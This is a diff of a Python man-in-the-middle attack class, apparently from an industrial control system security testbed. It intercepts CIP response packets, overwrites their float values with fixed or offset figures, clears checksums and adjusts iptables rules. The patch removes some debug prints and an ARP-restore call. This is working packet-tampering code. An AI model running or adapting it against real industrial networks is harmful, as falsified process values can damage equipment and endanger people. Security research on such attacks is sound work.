@@ -55,28 +55,15 @@ class PacketAttack(SyncedAttack):
                     p = IP(packet.payload)
                     # Packets with 100 <= length < 116 are CIP response packets
                     if 100 <= p[IP].len < 116:
-                        print("MITM 🖥️ -----------------------")
-                        print("MITM 🖥️:", "CIP Response 📦:", "source:", p[IP].src.ljust(16),
-                              str(p[TCP].sport).ljust(6), "   destination:",
-                              p[IP].dst.ljust(16), str(p[TCP].dport).ljust(6), str(p[IP].len).ljust(6))
-                        print("MITM 🖥️:", "Value:", translate_payload_to_float(p[Raw].load))
-                        print("MITM 🖥️:", "Old Load in HEX:", p[Raw].load.hex())
-                        print("MITM 🖥️:", "CIP Response 📦:", "Payload overwriting")
-                        # print("MITM 🖥️:", "Showing 📦:", packet2.show2())
-                        # print("MITM 🖥️:", "Showing1 📦:", p.show(dump=True))
-                        p[Raw].load = translate_float_to_payload(self.intermediate_attack['value'], p[Raw].load)
-                        print("MITM 🖥️:", "New Value:", translate_payload_to_float(p[Raw].load))
-                        print("MITM 🖥️:", "New Load in HEX:", p[Raw].load.hex())
+                        if 'value' in self.intermediate_attack.keys():
+                            p[Raw].load = translate_float_to_payload(self.intermediate_attack['value'], p[Raw].load)
+                        elif 'offset' in self.intermediate_attack.keys():
+                            p[Raw].load = translate_float_to_payload(translate_payload_to_float(p[Raw].load) + self.intermediate_attack['offset'], p[Raw].load)
 
-                        # p[Raw].load = p[Raw].load[:-2] + b'\x12\x34'
                         del p[TCP].chksum
                         del p[IP].chksum
 
-                        # print("MITM 🖥️:", "Showing2 📦:", p.show(dump=True))
-
                         packet.payload = bytes(p)
-
-                        # packet.payload = translate_float_to_payload(self.intermediate_attack['value'], packet.payload)
 
                     packet.mangle()
 
@@ -95,9 +82,6 @@ class PacketAttack(SyncedAttack):
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
-
-        restore_arp("192.168.1.1", "192.168.1.254")
-        # restore_arp("192.168.1.254", "192.168.1.1")
 
         self.run_thread = False
         self.queue.close()
